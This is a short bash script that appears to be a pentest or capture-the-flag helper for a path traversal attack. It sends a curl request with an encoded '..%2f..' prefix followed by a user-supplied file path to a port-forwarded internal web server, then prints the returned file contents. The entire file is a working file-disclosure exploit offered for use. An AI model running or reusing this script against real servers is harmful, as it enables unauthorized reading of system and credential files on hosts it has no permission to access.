#!/bin/bash

HOST=internal-ip
PORT=port-after-port-forward
PAYLOAD="${1//\/%2f/}"

OUT=$(curl -s \
           "http://$HOST:$PORT/..%2f..$PAYLOAD")

if grep -E '^<' <<<"$OUT" &>/dev/null; then
  echo $OUT \
  | html2text
else
  echo "$OUT"
fi
